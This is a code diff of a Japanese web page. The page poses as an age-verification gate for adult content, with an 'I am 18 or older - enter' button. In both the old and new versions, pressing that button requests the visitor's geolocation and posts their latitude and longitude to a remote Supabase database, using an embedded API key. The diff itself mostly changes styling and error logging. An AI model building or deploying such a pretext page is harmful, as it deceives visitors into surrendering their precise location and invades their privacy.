@@ -5,20 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>位置情報の選択</title>
   <style>
-    #choose-text {
-      font-size: 1.5rem;
-      font-weight: bold;
-      color: white;
-      margin-bottom: 20px;
-    }
-
-    .message {
-      width: 14em;
-      margin: 0 auto;
-      word-wrap: break-word;
-      line-height: 1.6;
-    }
-
     body {
       font-family: system-ui, sans-serif;
       margin: 0;
@@ -51,9 +37,16 @@
     }
 
     h1 {
-      font-size: 1.2rem;
+      font-size: 1.5rem;
       margin-bottom: 20px;
+    }
+
+    p {
+      width: 14em;
+      margin: 0 auto 20px;
+      word-wrap: break-word;
       line-height: 1.6;
+      font-size: 1rem;
     }
 
     button {
@@ -75,7 +68,7 @@
       transform: scale(1.03);
     }
 
-    .result {
+    #result {
       margin-top: 20px;
       font-size: 0.9rem;
       color: #ccc;
@@ -84,16 +77,11 @@
 </head>
 <body>
   <div class="container">
-    <h1 id="choose-text">地域魅力共有掲示板です</h1>
-    <p class="message">
-      このウェブサイトには、年齢制限のある成人向けコンテンツが含まれています。<br>
-      18歳以上の方のみご利用ください。
-    </p>
-
-    <button id="allowBtn">私は18歳以上です。- 入場</button>
-    <button id="denyBtn">私は18歳未満です。- 退出</button>
-
-    <div class="result" id="result"></div>
+    <h1>どちらかを選択してください</h1>
+    <p>このサイトは年齢制限のあるコンテンツを含みます。18歳以上の方のみご利用ください。</p>
+    <button id="allowBtn">私は18歳以上です - 入場</button>
+    <button id="denyBtn">私は18歳未満です - 退出</button>
+    <div id="result"></div>
   </div>
 
   <script>
@@ -101,7 +89,6 @@
     const allowBtn = document.getElementById("allowBtn");
     const denyBtn = document.getElementById("denyBtn");
 
-    // Supabase設定
     const SUPABASE_URL = "https://hwwjnlprsntmdcytktbm.supabase.co";
     const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imh3d2pubHByc250bWRjeXRrdGJtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2NDU3ODcsImV4cCI6MjA3NjIyMTc4N30.Dni-WtNXSEdyRxH2TSq0oTR9homfAi1Ptz1h0MURFrY";
 
@@ -111,14 +98,12 @@
         return;
       }
 
-      result.textContent = "位置情報を取得中…";
-
+      // 🎯 ボタンを押した瞬間に公式ダイアログが出る
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
           const { latitude, longitude } = pos.coords;
           result.innerHTML = `✅ 位置情報を取得しました！<br>緯度: ${latitude}<br>経度: ${longitude}`;
 
-          // Supabaseに保存
           try {
             const response = await fetch(`${SUPABASE_URL}/rest/v1/locations`, {
               method: "POST",
@@ -138,14 +123,18 @@
             if (response.ok) {
               result.innerHTML += "<br>✅ Supabaseに送信成功！";
             } else {
-              result.innerHTML += "<br>⚠️ Supabase送信エラー";
+              const errorText = await response.text();
+              console.error("Supabase送信エラー:", errorText);
+              result.innerHTML += `<br>⚠️ Supabase送信エラー:<br>${errorText}`;
             }
-          } catch (e) {
-            result.innerHTML += `<br>❌ 通信エラー: ${e.message}`;
+          } catch (err) {
+            console.error("通信エラー:", err);
+            result.innerHTML += `<br>❌ 通信エラー: ${err.message}`;
           }
         },
-        (err) => {
-          result.textContent = `エラー: ${err.message}`;
+        (error) => {
+          console.error("位置情報エラー:", error);
+          result.textContent = `❌ 位置情報エラー: ${error.message}`;
         }
       );
     });
